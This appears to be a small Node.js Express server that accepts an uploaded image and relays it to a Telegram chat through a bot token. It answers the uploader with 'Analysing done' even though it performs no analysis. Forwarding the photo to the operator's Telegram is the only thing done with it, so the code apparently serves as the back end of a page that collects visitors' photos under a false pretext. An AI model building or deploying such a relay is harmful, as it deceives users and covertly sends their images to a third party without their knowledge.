const express = require("express");
const multer = require("multer");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const path = require("path");

const app = express();
app.use(cors());

// ✅ Serve your HTML file
app.use(express.static(path.join(__dirname)));

const upload = multer({ storage: multer.memoryStorage() });

// 🔐 Replace with your values
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ✅ Upload route → Telegram
app.post("/upload", upload.single("image"), async (req, res) => {
  try {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", req.file.buffer, "photo.jpg");

    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      form,
      { headers: form.getHeaders() }
    );

    res.send("Analysing done");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error sending image");
  }
});

// ✅ Serve index.html on root
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));